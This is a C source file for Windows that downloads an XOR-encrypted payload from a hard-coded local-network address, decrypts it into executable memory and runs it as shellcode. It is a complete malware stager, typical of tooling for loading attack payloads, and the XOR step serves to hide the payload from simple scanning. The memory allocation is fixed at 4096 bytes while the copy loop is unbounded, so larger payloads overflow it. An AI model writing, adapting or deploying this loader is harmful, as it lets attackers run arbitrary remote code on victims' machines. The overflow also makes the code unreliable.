#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <wininet.h>

#define XOR_KEY 0xAA
#define BUFFER_SIZE 4096

// Function to download and decrypt shellcode using WinInet
void download_and_execute_shellcode(const char *url) {
    HINTERNET hInternet, hConnect;
    BYTE buffer[BUFFER_SIZE];
    DWORD bytesRead, offset = 0;

    // Initialize WinInet
    hInternet = InternetOpen("Downloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        fprintf(stderr, "InternetOpen failed: %lu\n", GetLastError());
        return;
    }

    // Open the URL
    hConnect = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (hConnect == NULL) {
        fprintf(stderr, "InternetOpenUrl failed: %lu\n", GetLastError());
        InternetCloseHandle(hInternet);
        return;
    }

    // Allocate executable memory
    void *exec = VirtualAlloc(NULL, BUFFER_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!exec) {
        fprintf(stderr, "VirtualAlloc failed\n");
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }

    // Read and decrypt the shellcode
    while (InternetReadFile(hConnect, buffer, BUFFER_SIZE, &bytesRead) && bytesRead > 0) {
        for (DWORD i = 0; i < bytesRead; i++) {
            buffer[i] ^= XOR_KEY; // Decrypt using XOR
        }
        memcpy((BYTE *)exec + offset, buffer, bytesRead); // Copy decrypted bytes
        offset += bytesRead;
    }

    // Execute the shellcode
    ((void(*)())exec)();

    // Clean up
    VirtualFree(exec, 0, MEM_RELEASE);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

int main() {
    const char *url = "http://192.168.1.18:8000/enc.bin";
    download_and_execute_shellcode(url);
    return 0;
}
